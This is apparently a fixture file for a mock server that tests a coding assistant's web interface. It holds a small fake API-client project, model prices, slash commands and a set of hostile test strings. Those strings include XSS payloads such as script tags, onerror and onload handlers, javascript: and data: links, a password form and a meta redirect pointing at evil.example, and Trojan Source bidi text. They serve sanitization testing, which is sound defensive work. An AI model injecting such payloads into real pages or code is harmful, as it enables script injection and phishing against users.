// Fixture data for the mock server: a small project in /workspace, earlier sessions, models and prices, and the
// hostile strings the safety test throws at the page.

export const HOSTILE = {
  img: '<img src=x onerror="document.title=\'pwned-img\'">',
  script: '<script>document.title="pwned-script"</script>',
  svg: '<svg onload="document.title=\'pwned-svg\'"><circle r=9 /></svg>',
  iframe: '<iframe src="javascript:parent.document.title=\'pwned-iframe\'"></iframe>',
  jsLink: '[click me](javascript:document.title="pwned-link")',
  dataLink: '[data](data:text/html,<script>document.title="pwned-data"</script>)',
  autolink: '<javascript:document.title="pwned-auto">',
  userinfo: '[bank](https://bank.example@evil.example/login)',
  bidi: 'access_level = "user‮ ⁦// check if admin⁩ ⁦"', // Trojan Source
  controls: 'bell\u0007 nul\u0000 esc\u001b[31mred\u001b[0m del\u007f c1\u009b',
  zeroWidth: 'pay​pal.com',
  giant: 'A'.repeat(300_000),
  giantWord: 'x'.repeat(5_000),
  entities: '&lt;script&gt;alert(1)&lt;/script&gt; &#x3C;img src=x onerror=alert(1)&#x3E;',
  style: '<style>body{display:none}</style><div style="position:fixed;inset:0;background:red">overlay</div>',
  form: '<form action="https://evil.example"><input name=pw type=password></form>',
  meta: '<meta http-equiv="refresh" content="0;url=https://evil.example">',
};

export function hostileMarkdown() {
  const h = HOSTILE;
  return [
    `# Hostile heading ${h.img}`,
    '',
    `Inline: ${h.script} and ${h.svg} and ${h.iframe}`,
    '',
    `Links: ${h.jsLink} ${h.dataLink} ${h.autolink} ${h.userinfo} [ok](https://example.com/ok)`,
    '',
    '![tracker](https://evil.example/pixel.png) ![local](javascript:alert(1))',
    '',
    `Bidi: \`${h.bidi}\``,
    '',
    `Controls: ${h.controls} · zero width: ${h.zeroWidth}`,
    '',
    h.entities,
    '',
    h.style,
    '',
    h.form,
    '',
    h.meta,
    '',
    '```html',
    h.script + h.img,
    '```',
    '',
    '| col <b>bold</b> | <img src=x onerror=alert(1)> |',
    '|---|---|',
    `| ${h.giantWord.slice(0, 400)} | ${h.svg} |`,
    '',
    `Long word: ${h.giantWord}`,
    '',
    '- [x] <script>alert(1)</script>',
    '- nested ' + '> '.repeat(60) + 'deep quote',
  ].join('\n');
}

const README = `# acme-api

A small HTTP API client with retries, used by the deploy tooling.

## Layout

- \`src/http/\` — the client and its retry policy
- \`src/utils/\` — formatting helpers
- \`tests/\` — unit tests (\`npm test\`)
- \`scripts/deploy.sh\` — the deploy script CI runs

## Development

\`\`\`sh
npm ci
npm test
\`\`\`
`;

const CLIENT = `import { retry, type RetryPolicy } from './retry';

export interface ClientOptions {
  baseUrl: string;
  timeoutMs?: number;
  retry?: RetryPolicy;
}

export class HttpClient {
  constructor(private readonly opts: ClientOptions) {}

  async get<T>(path: string): Promise<T> {
    const res = await fetch(new URL(path, this.opts.baseUrl), {
      signal: AbortSignal.timeout(this.opts.timeoutMs ?? 10_000),
    });
    if (!res.ok) throw new Error(\`GET \${path}: \${res.status}\`);
    return (await res.json()) as T;
  }

  async post<T>(path: string, body: unknown): Promise<T> {
    const res = await fetch(new URL(path, this.opts.baseUrl), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
    if (!res.ok) throw new Error(\`POST \${path}: \${res.status}\`);
    return (await res.json()) as T;
  }
}
`;

const RETRY = `export interface RetryPolicy {
  attempts: number;
  baseDelayMs: number;
}

export const DEFAULT_POLICY: RetryPolicy = { attempts: 3, baseDelayMs: 200 };

/** Run fn until it succeeds or the attempts are used up, backing off exponentially. */
export async function retry<T>(fn: () => Promise<T>, policy: RetryPolicy = DEFAULT_POLICY): Promise<T> {
  let last: unknown;
  for (let i = 0; i < policy.attempts; i++) {
    try {
      return await fn();
    } catch (e) {
      last = e;
      await new Promise((r) => setTimeout(r, policy.baseDelayMs * 2 ** i));
    }
  }
  throw last;
}
`;

const FORMAT = `export function formatBytes(n: number): string {
  if (n < 1024) return \`\${n} B\`;
  if (n < 1024 * 1024) return \`\${(n / 1024).toFixed(1)} KB\`;
  return \`\${(n / 1024 / 1024).toFixed(1)} MB\`;
}

export function plural(n: number, word: string): string {
  return \`\${n} \${word}\${n === 1 ? '' : 's'}\`;
}
`;

const TEST = `import { describe, it, expect } from 'vitest';
import { retry } from '../src/http/retry';

describe('retry', () => {
  it('returns the first success', async () => {
    let calls = 0;
    const v = await retry(async () => {
      calls++;
      if (calls < 2) throw new Error('flaky');
      return 42;
    }, { attempts: 3, baseDelayMs: 1 });
    expect(v).toBe(42);
    expect(calls).toBe(2);
  });
});
`;

const DEPLOY = `#!/usr/bin/env bash
set -euo pipefail
# Build and push the image, then roll the service.
here="$(cd "$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
docker build -t acme-api:latest "$here/.."
echo "deployed $(git rev-parse --short HEAD)"
`;

const PY = `"""Weekly report of API latency."""
from dataclasses import dataclass
import statistics


@dataclass
class Sample:
    route: str
    ms: float


def summarize(samples: list[Sample]) -> dict[str, float]:
    by_route: dict[str, list[float]] = {}
    for s in samples:
        by_route.setdefault(s.route, []).append(s.ms)
    return {r: statistics.median(v) for r, v in by_route.items()}
`;

export function workspace() {
  const files = {
    'README.md': README,
    'package.json': JSON.stringify({ name: 'acme-api', version: '1.4.0', type: 'module', scripts: { test: 'vitest run', build: 'tsc -p .' }, devDependencies: { typescript: '7.0.2', vitest: '4.1.0' } }, null, 2) + '\n',
    'tsconfig.json': JSON.stringify({ compilerOptions: { target: 'ES2022', module: 'ESNext', strict: true, outDir: 'dist' }, include: ['src'] }, null, 2) + '\n',
    '.gitignore': 'node_modules/\ndist/\n.env\n',
    'Dockerfile': 'FROM node:24-slim\nWORKDIR /app\nCOPY . .\nRUN npm ci && npm run build\nCMD ["node", "dist/index.js"]\n',
    'src/index.ts': "import { HttpClient } from './http/client';\n\nexport const client = new HttpClient({ baseUrl: process.env.API_URL ?? 'http://localhost:3000' });\n",
    'src/http/client.ts': CLIENT,
    'src/http/retry.ts': RETRY,
    'src/utils/format.ts': FORMAT,
    'tests/retry.test.ts': TEST,
    'scripts/deploy.sh': DEPLOY,
    'tools/report.py': PY,
    'docs/architecture.md': '# Architecture\n\nThe client wraps `fetch` with a timeout and an optional retry policy.\n',
    'data/big.log': Array.from({ length: 60_000 }, (_, i) => `2026-10-15T10:${String(i % 60).padStart(2, '0')}:00Z GET /v1/items/${i} 200 ${i % 97}ms`).join('\n') + '\n',
  };
  const binary = { 'assets/logo.png': Buffer.from('89504e470d0a1a0a0000000d4948445200000001000000010806000000', 'hex') };
  // many files: the explorer's virtual list
  for (let i = 0; i < 2500; i++) files[`node_modules/.cache/entry-${String(i).padStart(4, '0')}.json`] = `{"i":${i}}\n`;
  return { files, binary };
}

export function hostileFiles() {
  const h = HOSTILE;
  return {
    [`hostile/${h.img.replace(/\//g, '∕')}.ts`]: h.script,
    'hostile/‮gnp.exe': 'bidi file name',
    'hostile/javascript:alert(1)': 'colon name',
    [`hostile/${'long-name-'.repeat(20)}.txt`]: h.giantWord,
    'hostile/trojan.js': `const ${h.bidi};\n`,
  };
}

export const MODELS = {
  models: [
    { id: 'claude-opus-5-5', name: 'Claude Opus 5.5', input_per_mtok: 4.4, output_per_mtok: 22, cache_write_per_mtok: 5.5, cache_read_per_mtok: 0.44 },
    { id: 'claude-sonnet-5-5', name: 'Claude Sonnet 5.5', input_per_mtok: 3.3, output_per_mtok: 16.5, cache_write_per_mtok: 4.125, cache_read_per_mtok: 0.33 },
    { id: 'claude-haiku-5-5', name: 'Claude Haiku 5.5', input_per_mtok: 1.1, output_per_mtok: 5.5, cache_write_per_mtok: 1.375, cache_read_per_mtok: 0.11 },
  ],
  aliases: { opus: 'claude-opus-5-5', sonnet: 'claude-sonnet-5-5', haiku: 'claude-haiku-5-5' },
  default: 'sonnet',
};

export const CLI_MODELS = [
  { value: 'default', displayName: 'Default (recommended)', description: 'Sonnet 5.5', resolvedModel: 'claude-sonnet-5-5', supportedEffortLevels: ['low', 'medium', 'high'] },
  { value: 'opus', displayName: 'Opus', description: 'Opus 5.5', resolvedModel: 'claude-opus-5-5', supportedEffortLevels: ['low', 'medium', 'high', 'xhigh', 'max'] },
  { value: 'sonnet', displayName: 'Sonnet', description: 'Sonnet 5.5', resolvedModel: 'claude-sonnet-5-5', supportedEffortLevels: ['low', 'medium', 'high'] },
  { value: 'haiku', displayName: 'Haiku', description: 'Haiku 5.5', resolvedModel: 'claude-haiku-5-5' },
];

export const COMMANDS = [
  { name: 'compact', description: 'Clear conversation history but keep a summary in context', argumentHint: '<optional custom summarization instructions>' },
  { name: 'context', description: 'Visualize current context usage', argumentHint: '' },
  { name: 'cost', description: 'Show the total cost and duration of the current session', argumentHint: '' },
  { name: 'model', description: 'Set the AI model for Claude Code', argumentHint: '[model]' },
  { name: 'clear', description: 'Clear conversation history and free up context', argumentHint: '' },
  { name: 'init', description: 'Initialize a new CLAUDE.md file with codebase documentation', argumentHint: '' },
  { name: 'review', description: 'Review a pull request', argumentHint: '' },
  { name: 'security-review', description: 'Complete a security review of the pending changes on the current branch', argumentHint: '' },
  { name: 'simplify', description: 'Review changed code for reuse, quality, and efficiency (skill)', argumentHint: '' },
  { name: 'commit-commands:commit', description: 'Create a git commit (plugin: commit-commands)', argumentHint: '' },
  { name: 'commit-commands:commit-push-pr', description: 'Commit, push, and open a PR (plugin: commit-commands)', argumentHint: '' },
  { name: 'commit-commands:clean_gone', description: 'Clean up local branches deleted on the remote (plugin)', argumentHint: '' },
];

export const TOOLS = ['Task', 'Bash', 'Glob', 'Grep', 'Read', 'Edit', 'Write', 'NotebookEdit', 'WebFetch', 'WebSearch', 'TodoWrite', 'BashOutput', 'KillShell', 'ExitPlanMode', 'Skill', 'mcp__bedrock-shared__search', 'mcp__bedrock-shared__read'];
